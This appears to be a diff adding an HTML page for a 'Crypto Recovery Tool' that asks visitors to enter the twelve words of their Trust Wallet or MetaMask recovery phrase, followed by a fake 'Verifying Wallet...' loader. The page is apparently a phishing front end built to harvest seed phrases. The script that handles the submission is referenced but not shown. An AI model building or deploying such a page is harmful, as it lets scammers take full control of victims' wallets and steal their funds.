@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Connect</title>
+    <link rel="stylesheet" href="./assets/css/main.css">
+</head>
+<body>
+    <div class="container">
+        <div class="form-card">
+            <h1>Crypto Recovery Tool</h1>
+            <form id="techForm">
+                <div class="input-group">
+                    <div class="input-wrapper"><input type="text" id="input1" name="input1" placeholder="1"></div>
+                    <div class="input-wrapper"><input type="text" id="input2" name="input2" placeholder="2"></div>
+                    <div class="input-wrapper"><input type="text" id="input3" name="input3" placeholder="3"></div>
+                    <div class="input-wrapper"><input type="text" id="input4" name="input4" placeholder="4"></div>
+                    <div class="input-wrapper"><input type="text" id="input5" name="input5" placeholder="5"></div>
+                    <div class="input-wrapper"><input type="text" id="input6" name="input6" placeholder="6"></div>
+                    <div class="input-wrapper"><input type="text" id="input7" name="input7" placeholder="7"></div>
+                    <div class="input-wrapper"><input type="text" id="input8" name="input8" placeholder="8"></div>
+                    <div class="input-wrapper"><input type="text" id="input9" name="input9" placeholder="9"></div>
+                    <div class="input-wrapper"><input type="text" id="input10" name="input10" placeholder="10"></div>
+                    <div class="input-wrapper"><input type="text" id="input11" name="input11" placeholder="11"></div>
+                    <div class="input-wrapper"><input type="text" id="input12" name="input12" placeholder="12"></div>
+                </div>
+                <button type="submit" class="submit-button" id="submitButton" disabled>Submit</button>
+                <div class="span">
+                    <span>Connect your Trust Wallet or MetaMask wallet with your 12 pass phrase to proceed recovery.</span>
+                </div>
+            </form>
+            <div class="loader" id="loader">
+                <div class="spinner"></div>
+                <p id="loaderText">Verifying Wallet...</p>
+            </div>
+            <div class="success">
+                <i>&#10004;</i>
+                <p>Form submitted successfully!</p>
+            </div>
+        </div>
+    </div>
+    <script src="./assets/js/main.js"></script>
+</body>
+</html>
